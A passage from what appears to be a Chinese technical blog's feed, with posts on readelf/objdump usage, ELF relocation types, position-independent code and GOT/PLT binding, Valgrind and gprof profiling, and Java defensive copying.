class="string">(bytes)</span></span><br><span class="line"><span class="attr">Number of program headers:</span>         <span class="number">8</span></span><br><span class="line"><span class="attr">Size of section headers:</span>           <span class="number">64</span> <span class="string">(bytes)</span></span><br><span class="line"><span class="attr">Number of section headers:</span>         <span class="number">29</span></span><br><span class="line"><span class="attr">Section header string table index:</span> <span class="number">26</span></span><br></pre></td></tr></table></figure><h2 id="编译时是否使用了-g选项（加入调试信息）"><a href="#编译时是否使用了-g选项（加入调试信息）" class="headerlink" title="编译时是否使用了-g选项（加入调试信息）"></a>编译时是否使用了-g选项（加入调试信息）</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S main | <span class="keyword">grep</span> <span class="keyword">debug</span></span><br><span class="line">$ readelf -S main.<span class="keyword">o</span> | <span class="keyword">grep</span> <span class="keyword">debug</span></span><br></pre></td></tr></table></figure><p>用-S选项是显示所有段信息；如果编译时使用了-g选项，则会有debug段。</p><h2 id="查看本机目标结构（使用大端还是小端存储）"><a href="#查看本机目标结构（使用大端还是小端存储）" class="headerlink" title="查看本机目标结构（使用大端还是小端存储）"></a>查看本机目标结构（使用大端还是小端存储）</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>objdump -i</span><br></pre></td></tr></table></figure><h2 id="显示符号表入口"><a href="#显示符号表入口" class="headerlink" title="显示符号表入口"></a>显示符号表入口</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>objdump  -t main.o</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理linux中readelf、objdump工具的用法。&lt;/p&gt;</summary>
    
    
    
    <category term="linux" scheme="https://www.fvolcano.red/categories/linux/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>重定位类型介绍</title>
    <link href="https://www.fvolcano.red/2021/different-types-of-relocating/"/>
    <id>https://www.fvolcano.red/2021/different-types-of-relocating/</id>
    <published>2021-05-30T13:30:42.000Z</published>
    <updated>2021-05-30T13:30:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理32位elf格式中常见的重定位类型的含义与用法。</p><a id="more"></a><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><p><a href="https://bbs.pediy.com/thread-246373.htm">32位elf格式中的10种重定位类型</a></p></li><li><p><a href="http://www.360doc.com/content/17/1204/19/7377734_709898612.shtml">通过elf各种重定位类型，理解不同场合的链接过程</a></p></li><li><p><a href="https://docs.oracle.com/cd/E19253-01/819-7050/chapter6-26/index.html">表格整理</a></p></li></ol><p><strong>提出的所有内存地址都是在链接好的可执行文件中的已分配地址，如addr(.text)</strong></p><h1 id="R-386-32"><a href="#R-386-32" class="headerlink" title="R_386_32"></a>R_386_32</h1><p>公式：S+A</p><p>S：重定项中VALUE成员所指符号的内存地址</p><p>A：被重定位处原值，表示”引用符号的内存地址”与S的偏移</p><h1 id="R-386-RELATIVE"><a href="#R-386-RELATIVE" class="headerlink" title="R_386_RELATIVE"></a>R_386_RELATIVE</h1><p>公式：B+A</p><p>B：.so文件加载到内存中的基地址</p><p>A：被重定位处原值，表示引用符号在.so文件中的偏移</p><p><img src="/2021/different-types-of-relocating/v2-f78215bd90ddb90847d2253c2b6a12c5_r.jpg" alt="img"></p><h1 id="R-386-PC32"><a href="#R-386-PC32" class="headerlink" title="R_386_PC32"></a>R_386_PC32</h1><p>公式：S+A-P</p><p>S：重定项中VALUE成员所指符号的内存地址</p><p>A：被重定位处原值，表示”被重定位处”与”下一条指令”的偏移</p><p>P：被重定位处的内存地址</p><h1 id="R-386-GOTPC"><a href="#R-386-GOTPC" class="headerlink" title="R_386_GOTPC"></a>R_386_GOTPC</h1><p>公式：GOT+A-P</p><p>GOT：运行时，.got段的结束地址</p><p>A：被重定位处原值，表示”被重定位处”在机器码中的偏移</p><p>P：被重定位处的内存地址</p><h1 id="R-386-GOT32"><a href="#R-386-GOT32" class="headerlink" title="R_386_GOT32"></a>R_386_GOT32</h1><p>公式：G</p><p>G：引用符号的地址指针，相对于GOT的偏移</p><h1 id="R-386-GOLB-DAT"><a href="#R-386-GOLB-DAT" class="headerlink" title="R_386_GOLB_DAT"></a>R_386_GOLB_DAT</h1><p>公式：S</p><p>S：重定项中VALUE成员所指符号的内存地址</p><p><img src="/2021/different-types-of-relocating/v2-376d67a7ee2bb4099394606848a7de08_r.jpg" alt="img"></p><h1 id="R-386-GOTOFF"><a href="#R-386-GOTOFF" class="headerlink" title="R_386_GOTOFF"></a>R_386_GOTOFF</h1><p>公式：S-GOT </p><p>S：重定项中VALUE成员所指符号的内存地址 </p><p>GOT：运行时，.got段的结束地址</p><h1 id="R-386-PLT32"><a href="#R-386-PLT32" class="headerlink" title="R_386_PLT32"></a>R_386_PLT32</h1><p>公式：L+A-P</p><p>L：&lt;重定项中VALUE成员所指符号@plt&gt;的内存地址</p><p>A：被重定位处原值，表示”被重定位处”相对于”下一条指令”的偏移</p><p>P：被重定位处的内存地址</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理32位elf格式中常见的重定位类型的含义与用法。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机系统" scheme="https://www.fvolcano.red/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>PIC（位置无关代码）的实现</title>
    <link href="https://www.fvolcano.red/2021/why-we-need-PIC/"/>
    <id>https://www.fvolcano.red/2021/why-we-need-PIC/</id>
    <published>2021-05-30T13:27:52.000Z</published>
    <updated>2021-05-30T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>In <a href="https://www.wikiwand.com/en/Computing">computing</a>, <strong>position-independent code</strong> (<strong>PIC</strong>) or <strong>position-independent executable</strong> (<strong>PIE</strong>) is a body of <a href="https://www.wikiwand.com/en/Machine_code">machine code</a> that, being placed somewhere in the <a href="https://www.wikiwand.com/en/Primary_memory">primary memory</a>, executes properly regardless of its <a href="https://www.wikiwand.com/en/Absolute_address">absolute address</a>.<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.wikiwand.com/en/Position-independent_code">Position-independent code-wiki</a></li><li><a href="https://sa.sogou.com/sgsearch/sgs_tc_news.php?req=XJfILdCUU2TuOxZDyaoqZBTGiGQumUZMYP-S-WEG-a0=&user_type=1">深入理解 Linux 位置无关代码 PIC</a></li><li><a href="https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries">Position Independent Code (PIC) in shared libraries</a></li><li><a href="https://juejin.cn/post/6844903609558106125">稍微了解地址无关代码(Position-Independent Code)</a></li><li><a href="https://www.anquanke.com/post/id/197214">浅谈位置无关代码</a></li><li><a href="https://dirtysalt.github.io/html/pic-code.html">《深入理解计算机系统》- PIC(位置无关代码)</a></li><li><a href="https://www.icourse163.org/course/NJU-1001625001">MOOC-计算机系统基础(一)：程序的表示、转换与链接</a></li><li><a href="https://www.cnblogs.com/Przz/p/6505917.html">深入理解-位置无关代码</a></li></ol><p>没有开启地址随机化(ASLR - Address Space Layout Randomization)时，系统不会随机化分配程序的虚拟地址空间，程序所有的地址都是按照固定的规则来生成。通过objdump命令反汇编后可以看到，对于全局变量和函数调用的访问，汇编指令跟的地址都是固定的，这样的代码我们就称它为位置相关的。</p><p>固定地址的方式虽然简单，但是无法实现一些高级特性比如动态库支持。动态库的代码会通过mmap()系统调用来映射到进程的虚拟地址空间，不同的进程中，同一个动态库映射的虚拟地址是不确定的。如果动态库的实现上使用位置相关的代码，则无法达到其任意地址运行的目的，这种情况下我们就需要引入位置无关代码PIC的概念了。</p><p><img src="/2021/why-we-need-PIC/t01b5c7da6c4d3168d7.png" alt="img"></p><p>PIC，全称Position Independent Code。位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。</p><p>PIC的做法是让指令部分做到地址无关，所以可以让所有进程共享一份。但是数据部分并不地址无关，而是让所有进程在地址空间中都产生一份副本。</p><p>所以目标就是就是实现指令部分的无关，而指令中可能会包含对内部和外部的函数调用，以及内部和外部的数据访问，所以这样的划分就需要考虑四种情况。</p><h2 id="PIC的实现"><a href="#PIC的实现" class="headerlink" title="PIC的实现"></a>PIC的实现</h2><p>已知：当链接器将各个目标文件的所有section组合到一起的时候，链接器完全知道每个section的大小和它们之间的相对位置。因此可以计算出在.TEXT段内任意一条指令相对于.DATA段起始地址的相对偏移量。</p><h3 id="引用模块内数据"><a href="#引用模块内数据" class="headerlink" title="引用模块内数据"></a>引用模块内数据</h3><p>由“已知”可得，如果知道了当前指令的地址，那么就可以计算出数据段的地址。X86平台上没有获取当前指令指针寄存器IP的值的指令（X64上可以直接访问RIP），但可以通过一个小技巧来获取：</p><p><img src="/2021/why-we-need-PIC/image-20210531201257771.png" alt="image-20210531201257771"></p><p>这段代码在实际运行时，会有以下的事情发生：</p><ul><li>当cpu执行 call STUB的时候，会将下一条指令的地址（即IP中的值）保存到stack上，然后跳到标签STUB处执行。</li><li>STUB处的指令是pop ebx,这样就将 “pop ebx”这条指令所在的地址从stack弹出放到了ebx寄存器中，这样就得到了IP寄存器的值。</li></ul><p>在知道了当前的绝对地址后，根据已知的偏移量就可以得到数据段中某个变量的地址。</p><h3 id="引用模块内函数"><a href="#引用模块内函数" class="headerlink" title="引用模块内函数"></a>引用模块内函数</h3><h4 id="static-函数"><a href="#static-函数" class="headerlink" title="static 函数"></a>static 函数</h4><p>对这种函数的访问是最容易解决的问题，因为一个动态库在编译成一个模块之后，其中的指令之间的相对位置是固定的，所以通过一个相对跳转指令即可访问。</p><p><img src="/2021/why-we-need-PIC/1638d8862a2ef255" alt="img"></p><h4 id="全局函数"><a href="#全局函数" class="headerlink" title="全局函数"></a>全局函数</h4><p>因为为全局函数，所以要考虑一个叫做全局符号介入的问题，什么是全局符号介入呢？</p><p>在Linux下，当动态链接器加载一个模块时，需要将这个模块的符号加入到全局符号表中，如果某个要加入的符号名已经存在时，也就是此时重复了，这时候会忽略这次的添加操作，以第一次决议的符号为准，未来运行期间访问到这个符号的所有指令，都会使用第一次决议的符号，这时候情况和下面的外部函数情况相同。</p><h3 id="引用模块外数据"><a href="#引用模块外数据" class="headerlink" title="引用模块外数据"></a>引用模块外数据</h3><p>对于外部数据的访问，是通过全局偏移表global offset table（GOT）来实现的。</p><p>GOT是一张在data section中保存的一张表，里面记录了很多地址字段 (entry)。假设一条指令想要引用一个变量，并不是直接去用绝对地址，而是去引用GOT里的一个entry。GOT表在data section中的地址是明确的，GOT的entry包含了变量的绝对地址。</p><p><img src="/2021/why-we-need-PIC/image-20210531201310221-1622463190990.png" alt="image-20210531201310221"></p><p>但是还有一个问题，这个GOT表里存储的entry值又是怎么变成实际的绝对地址的呢？</p><p>动态加载器会解析rel.dyn段，当它看到重定向类型为R_386_GLOB_DAT的时候，会将符号var实际的地址值替换到记录的偏移处。</p><h3 id="引用模块外函数"><a href="#引用模块外函数" class="headerlink" title="引用模块外函数"></a>引用模块外函数</h3><p>与数据不同，因为有新特性：延迟绑定。</p><p>对于动态库的函数来说，在没有加载到程序的地址空间前，函数的实际地址都是未知的，动态加载器会处理这些问题，解析出实际地址的过程,这个过程称之为绑定。绑定的动作会消耗一些时间，因为加载器要通过特殊的查表、替换操作。</p><p>如果动态库有成百上千个函数接口，而实际的进程只用到了其中的几十个接口，如果全部都在加载的时候进行绑定操作，没有意义并且非常耗时。因此提出了延迟绑定的概念，程序只有在使用到对应接口时才实时地绑定接口地址。</p><p>为了实现延迟绑定，就额外增加了一个间接表PLT（过程链接表）。</p><p>PLT搭配GOT实现延迟绑定的过程如下：</p><p><img src="/2021/why-we-need-PIC/image-20210531201757402.png" alt="image-20210531201757402"></p><p>首先跳到PLT表对应函数地址PLT[n],然后取出GOT中对应的entry。GOT[n]里保存了实际要跳转的函数的地址，首次执行时此值为PLT[n]的prepare resolver的地址，这里准备了要解析的函数的相关参数，然后到PLT[0]处调用resolver进行解析。</p><p>resolver函数会做几件事情：</p><p>（1）解析出代码想要调用的func函数的实际地址A</p><p>（2）用实际地址A覆盖GOT[n]保存的plt_resolve_addr的值</p><p>（3）调用func函数</p><p>在之后的函数调用中，就不需要再走resolver过程了：</p><p><img src="/2021/why-we-need-PIC/image-20210531201922015.png" alt="image-20210531201922015"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;In &lt;a href=&quot;https://www.wikiwand.com/en/Computing&quot;&gt;computing&lt;/a&gt;, &lt;strong&gt;position-independent code&lt;/strong&gt; (&lt;strong&gt;PIC&lt;/strong&gt;) or &lt;strong&gt;position-independent executable&lt;/strong&gt; (&lt;strong&gt;PIE&lt;/strong&gt;) is a body of &lt;a href=&quot;https://www.wikiwand.com/en/Machine_code&quot;&gt;machine code&lt;/a&gt; that, being placed somewhere in the &lt;a href=&quot;https://www.wikiwand.com/en/Primary_memory&quot;&gt;primary memory&lt;/a&gt;, executes properly regardless of its &lt;a href=&quot;https://www.wikiwand.com/en/Absolute_address&quot;&gt;absolute address&lt;/a&gt;.&lt;/p&gt;</summary>
    
    
    
    <category term="计算机系统" scheme="https://www.fvolcano.red/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>程序性能分析工具Valgrind和gprof的使用</title>
    <link href="https://www.fvolcano.red/2021/how-to-use-valgrind-and-gprof/"/>
    <id>https://www.fvolcano.red/2021/how-to-use-valgrind-and-gprof/</id>
    <published>2021-05-28T12:03:41.000Z</published>
    <updated>2021-05-28T12:03:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>程序的性能分析在判断问题和改进代码上作用很大，Valgrind和gprof是两个很有用的分析工具。</p><a id="more"></a><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.howtoing.com/how-to-install-and-use-profiling-tool-gprof">如何在Linux上安装和使用分析工具Gprof</a></li><li><a href="https://www.thegeekstuff.com/2012/08/gprof-tutorial/">GPROF Tutorial – How to use Linux GNU GCC Profiling Tool</a></li><li><a href="https://blog.csdn.net/stanjiang2010/article/details/5655143">Linux性能评测工具之一：gprof篇</a></li><li><a href="https://zhuanlan.zhihu.com/p/149800013">valgrind诊断C/C++内存泄漏</a></li><li><a href="https://blog.csdn.net/tissar/article/details/87194737">Valgrind详细教程（1） Memcheck</a></li><li><a href="https://www.cprogramming.com/debugging/valgrind.html">Using Valgrind to Find Memory Leaks and Invalid Memory Use</a></li></ol><h1 id="Valgrind"><a href="#Valgrind" class="headerlink" title="Valgrind"></a>Valgrind</h1><p><a href="http://www.it.uc3m.es/pbasanta/asng/course_notes/memory_profiler_en.html#memcheck_tool">官方文档</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>C/C++中内存分配与管理是程序员比较头疼的事情，大型线上业务系统，系统内存泄漏到一定程序，可能会因为分配不到内存而导致宕机，后果很严重。</p><p>valgrind工具大件提供了许多调试和性能分析工具，包含包含七个生产质量工具：一个<strong>内存错误检测器</strong>，两个线程错误检测器，一个缓存和分支预测探查器，一个生成调用图的缓存和分支预测探查器以及两个不同的堆探查器。还包括一个实验性的SimPoint基本块矢量生成器。</p><p>这些工具中最流行的称为Memcheck。它可以检测C和C++程序中常见的许多与内存相关的错误，这些错误可能导致崩溃和不可预测的行为。实际上memcheck使用<strong>它自己的内存分配代替标准</strong>C中的内存分配（malloc和free），因此可以检测出一些异常信息。</p><p>Memcheck是Valgrind的王牌，它用于C/C++程序的内存错误检测：</p><ol><li>非法访问内存（堆、栈、内存段错误）</li><li>引用未初始化的变量</li><li>非法释放对内存（重复释放、释放与申请不匹配）</li><li>内存重叠错误</li><li>内存泄露</li><li>错误地申请内存</li><li>内存树的分析</li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o main_c main.c</span><br><span class="line">valgrind --tool=memcheck --leak-check=full ./main_c</span><br></pre></td></tr></table></figure><p>–tools=memcheck表示使用memcheck工具，valgrind默认的工具也是这个，加不加都可以。</p><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><ul><li><p>HEAP SUMMARY，它表示程序在堆上分配内存的情况，2 allocs表示分配了2次内存，0 frees表示释放了0次，72,714 bytes allocated表示分配了72,714个字节</p></li><li><p>如果有泄漏，valgrind会报告是哪个位置发生了泄漏（main中cpp第8行）</p></li><li><p>LEAK SUMMARY，表示不同的内存丢失类型</p></li><li><ul><li>definitely loss: 确认丢失，<strong>需修复</strong>因为在程序运行完的时候，没有指针指向它，指向它的指针在程序中丢失了；</li><li>indirectly lost: 间接丢失，<strong>无须处理</strong>，当使用了含有指针成员的类或结构时可能会报这个错误。这类错误无需直接修复，他们总是与”definitely lost”一起出现，只要修复”definitely lost”即可；</li><li>possibly lost: 可能丢失，<strong>需修复</strong>，发现了一个指向某块内存中部的指针，而不是指向内存块头部。这种指针一般是原先指向内存块头部，后来移动到了内存块的中部，还有可能该指针和该内存根本就没有关系，检测工具只是怀疑有内存泄漏。</li><li>still reachable: 可以访问，需修复，未丢失但也未释放。如果程序是正常结束的，那么它可能不会造成程序崩溃。表示泄漏的内存在程序运行完的时候，仍旧有指针指向它，因而，这种内存在程序运行结束之前可以释放。一般情况下valgrind不会报这种泄漏，除非使用了参数 –show-reachable=yes。</li><li>suppressed：已被解决，<strong>无须处理</strong>，出现了内存泄露但系统自动处理了；可以无视这类错误。</li></ul></li></ul><h1 id="gprof"><a href="#gprof" class="headerlink" title="gprof"></a>gprof</h1><p><a href="https://ftp.gnu.org/old-gnu/Manuals/gprof-2.9.1/html_node/gprof_toc.html">官方文档</a></p><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>gprof 是GNU gnu binutils工具之一，默认情况下linux系统当中都带有这个工具。</p><p>它实际上只是一个用于读取profile结果文件的工具。它采用混合方法来收集程序的统计信息，使用检测方法，在编译过程中在函数入口处插入计数器用于收集每个函数的被调用情况和被调用次数；也使用采样方法，在运行时按一定间隔去检查程序计数器并在分析时找出程序计数器对应的函数来统计函数占用的时间。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在编译和链接程序的时候（使用 -pg 编译和链接选项），gcc 在你应用程序的每个函数中都加入了一个名为mcount ( or  “_mcount”  , or  “__mcount” , 依赖于编译器或操作系统)的函数，也就是说你的应用程序里的每一个函数都会调用mcount, 而mcount 会在内存中保存一张函数调用图，并通过函数调用堆栈的形式查找子函数和父函数的地址。这张调用图也保存了所有与函数相关的调用时间，调用次数等等的所有信息。</p><h2 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h2><ol><li><p>在编译和链接时 加上-pg选项。一般我们可以加在 makefile 中。</p></li><li><p>执行编译的二进制程序。执行参数和方式同以前。</p></li><li><p>在程序运行目录下 生成 gmon.out 文件。如果原来有gmon.out 文件，将会被重写。</p></li><li><p>结束进程。这时 gmon.out 会再次被刷新。</p></li><li><p>用 gprof 工具分析 gmon.out 文件。</p></li></ol><p>一系列完整的使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -std=c99 -pg test_gprof.c -o test_gprof</span><br><span class="line">./test_gprof</span><br><span class="line">gprof test_gprof gmon.out &gt; profile-data.txt</span><br></pre></td></tr></table></figure><h2 id="输出信息"><a href="#输出信息" class="headerlink" title="输出信息"></a>输出信息</h2><p>Gprof生成的可读输出分为两部分：平面配置文件和调用图。以下是Gprof的手册页面关于这两个部分的信息：</p><p>“平面配置文件显示了您的程序在每个功能中花费了多少时间，以及调用多少次功能。如果您只想知道哪些功能可以烧录大部分的周期，那么这里就简明扼要。”</p><p>“调用图显示了对于每个函数，调用哪个函数，它调用了哪些其他函数，以及多少次。还有一个估计是在每个函数的子例程中花费了多少时间，这可以建议你所在的地方可能会尝试消除使用大量时间的函数调用。”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Flat profile:</span><br><span class="line"></span><br><span class="line">Each sample counts as 0.01 seconds.</span><br><span class="line"><span class="meta"> %</span><span class="bash">    cumulative self           self    total </span></span><br><span class="line"> time seconds    seconds calls  ms/call ms/call  name </span><br><span class="line"> 96.43 0.81      0.81      1    810.00  810.00   func3</span><br><span class="line"> 3.57 0.84       0.03      1    30.00   840.00   func1</span><br><span class="line"> 0.00 0.84       0.00      1    0.00    810.00   func2</span><br><span class="line"> 0.00 0.84       0.00      1    0.00    0.00     func4</span><br><span class="line"> </span><br><span class="line"> Call graph (explanation follows)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">granularity: each sample hit covers 4 byte(s) for 1.19% of 0.84 seconds</span><br><span class="line"></span><br><span class="line">index % time self children called name</span><br><span class="line">             0.03 0.81     1/1       main [2]</span><br><span class="line">[1]    100.0 0.03 0.81      1     func1 [1]</span><br><span class="line">             0.00 0.81     1/1       func2 [3]</span><br><span class="line">-----------------------------------------------</span><br><span class="line">                                     &lt;spontaneous&gt;</span><br><span class="line">[2]    100.0 0.00 0.84            main [2]</span><br><span class="line">             0.03 0.81     1/1       func1 [1]</span><br><span class="line">             0.00 0.00     1/1       func4 [5]</span><br><span class="line">-----------------------------------------------</span><br><span class="line">             0.00 0.81     1/1       func1 [1]</span><br><span class="line">[3]    96.4  0.00 0.81      1     func2 [3]</span><br><span class="line">             0.81 0.00     1/1       func3 [4]</span><br><span class="line">-----------------------------------------------</span><br><span class="line">             0.81 0.00     1/1       func2 [3]</span><br><span class="line">[4]    96.4  0.81 0.00      1      func3 [4]</span><br><span class="line">-----------------------------------------------</span><br><span class="line">             0.00 0.00     1/1       main [2]</span><br><span class="line">[5]    0.0   0.00 0.00      1      func4 [5]</span><br></pre></td></tr></table></figure><p><img src="/2021/how-to-use-valgrind-and-gprof/gprof-flat-profile.png" alt="img"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;程序的性能分析在判断问题和改进代码上作用很大，Valgrind和gprof是两个很有用的分析工具。&lt;/p&gt;</summary>
    
    
    
    <category term="工具" scheme="https://www.fvolcano.red/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>defensive copying 的为什么和怎么做</title>
    <link href="https://www.fvolcano.red/2021/how-to-implement-with-defensive-copying/"/>
    <id>https://www.fvolcano.red/2021/how-to-implement-with-defensive-copying/</id>
    <published>2021-05-27T13:59:57.000Z</published>
    <updated>2021-05-27T13:59:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>defensive copying(保护性拷贝)是在软件实现中常会用到的概念，这篇博客主要介绍为什么需要 defensive copy 和如何实现 defensive copying。</p><a id="more"></a><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ol><li><a href="https://www.baeldung.com/autovalue-defensive-copies">Defensive Copies for Collections Using AutoValue</a></li><li><a href="http://www.javapractices.com/topic/TopicAction.do?Id=15">Defensive copying</a></li><li><a href="https://www.wikiwand.com/en/Object_copying">Object copying-wiki</a></li></ol><h1 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h1><p>A class may have a mutable object as a field. There are two possible cases for how the state of a mutable object field can change:</p><ul><li>its state can be changed only by the native class - the native class <em>creates</em> the mutable object field, and is the only class which is directly aware of its existence</li><li>its state can be changed both by the native class and by its callers - the native class simply <em>points</em> to a mutable object which was created elsewhere</li></ul><p>Both cases are valid design choices, but you must be aware of which one is appropriate for each case.</p><p>If the mutable object field’s state should be changed only by the native class, then a <em>defensive copy</em> of the mutable object <em>must</em> be made any time it’s passed into (constructors and <code>set</code> methods) or out of (<code>get</code> methods) the class. If this is <em>not</em> done, then it’s simple for the caller to break encapsulation, by changing the state of an object which is simultaneously visible to <em>both</em> the class and its caller.</p><h2 id="参数引用"><a href="#参数引用" class="headerlink" title="参数引用"></a>参数引用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; favoriteMovies;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// accessors, constructor, toString, equals, hashcode omitted</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> favoriteMovies = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">favoriteMovies.add(<span class="string">&quot;Clerks&quot;</span>); <span class="comment">// fine</span></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person(<span class="string">&quot;Katy&quot;</span>, favoriteMovies);</span><br><span class="line">favoriteMovies.add(<span class="string">&quot;Dogma&quot;</span>); <span class="comment">// oh, no!</span></span><br></pre></td></tr></table></figure><h2 id="返回值引用"><a href="#返回值引用" class="headerlink" title="返回值引用"></a>返回值引用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EmailMessage msg = ...</span><br><span class="line">Date d = msg.getDate();</span><br><span class="line">d.setTime(d.getTime()+<span class="number">12345</span>); <span class="comment">// Changes the date inside msg</span></span><br></pre></td></tr></table></figure><h1 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h1><p>defensive copying 有时候也被叫做 “object copying”，从这个名字可以看出它的做法——拷贝一个对象。</p><h2 id="参数保护"><a href="#参数保护" class="headerlink" title="参数保护"></a>参数保护</h2><p>Because Java’s standard collection types may be mutable, the immutable <em>Person</em> type must protect itself from callers who would modify the <em>favoriteMovies</em> list after creating a new <em>Person</em>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, List&lt;String&gt; favoriteMovies)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.favoriteMovies = List.copyOf(favoriteMovies);</span><br><span class="line">    <span class="comment">// or </span></span><br><span class="line">    <span class="comment">// this.favoriteMovies = Collections.unmodifiableList(new ArrayList&lt;&gt;(favoriteMovies));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <em>Person</em> class must make a defensive copy of the <em>favoriteMovies</em> collection. By doing so, the <em>Person</em> class captures the state of the <em>favoriteMovies</em> list as it existed when the <em>Person</em> was created.</p><h2 id="返回值保护"><a href="#返回值保护" class="headerlink" title="返回值保护"></a>返回值保护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Date <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Date(date.getTime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="完整示例类"><a href="#完整示例类" class="headerlink" title="完整示例类"></a>完整示例类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 